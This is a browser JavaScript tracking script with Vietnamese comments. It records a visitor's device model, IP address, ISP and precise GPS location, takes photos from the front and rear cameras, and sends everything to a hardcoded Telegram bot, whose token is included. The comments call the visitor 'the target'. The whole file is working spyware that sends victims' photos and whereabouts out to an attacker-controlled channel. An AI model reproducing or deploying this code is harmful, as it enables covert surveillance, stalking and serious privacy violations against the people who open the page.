const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '',
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '', 
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// 1. Nhận diện thiết bị (Giữ nguyên logic iPhone/Android của mày)
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;
  info.time = new Date().toLocaleString('vi-VN');

  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else {
    info.device = platform || 'PC';
    info.os = 'Desktop';
  }
}

// 2. Lấy IP dân cư, IP gốc, ISP
async function getNetworkData() {
  try {
    const [res1, res2] = await Promise.all([
      fetch('https://api.ipify.org?format=json').then(r => r.json()),
      fetch('https://ipwho.is/').then(r => r.json())
    ]);
    info.ip = res1.ip; // IP dân cư
    info.realIp = res2.ip; // IP gốc
    info.isp = res2.connection?.org || 'VNNIC';
    info.country = res2.country || 'Vietnam';
    if(!info.lat) {
      info.lat = res2.latitude;
      info.lon = res2.longitude;
      info.address = `${res2.city}, ${res2.region} (Vị trí IP)`;
    }
  } catch (e) {}
}

// 3. Lấy vị trí GPS chính xác
async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve();
    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude;
        info.lon = pos.coords.longitude;
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name;
        } catch { info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`; }
        resolve();
      },
      () => resolve(),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// 4. Chụp ảnh
async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

// 5. Form báo cáo chuẩn mày yêu cầu
function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%
`.trim();
}

// 6. Hàm Gửi
async function sendReport(f, b) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  const media = [{ type: 'photo', media: 'attach://f', caption: getCaption() }];
  formData.append('f', f, 'f.jpg');
  if (b) {
    media.push({ type: 'photo', media: 'attach://b' });
    formData.append('b', b, 'b.jpg');
  }
  formData.append('media', JSON.stringify(media));
  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

// HÀM CHÍNH - FIX LỖI TỪ CHỐI VẪN GỬI
async function main() {
  // Bước 1: Xin quyền và chụp cam trước ngay
  let f = await captureCamera("user");

  // KIỂM TRA: Nếu f = null (Nó bấm Từ chối) thì DỪNG LUÔN, không chạy gì hết
  if (!f) {
    console.log("Mục tiêu từ chối Camera. Hủy lệnh gửi tin nhắn.");
    return; 
  }

  // Bước 2: Chỉ khi đã có ảnh mới đi lấy mấy cái IP, Vị trí này
  info.camera = '✅ Đã chụp camera trước và sau';
  detectDevice();
  await Promise.all([getNetworkData(), getLocation()]);
  let b = await captureCamera("environment");

  // Bước 3: Gửi báo cáo có ảnh
  await sendReport(f, b);
}
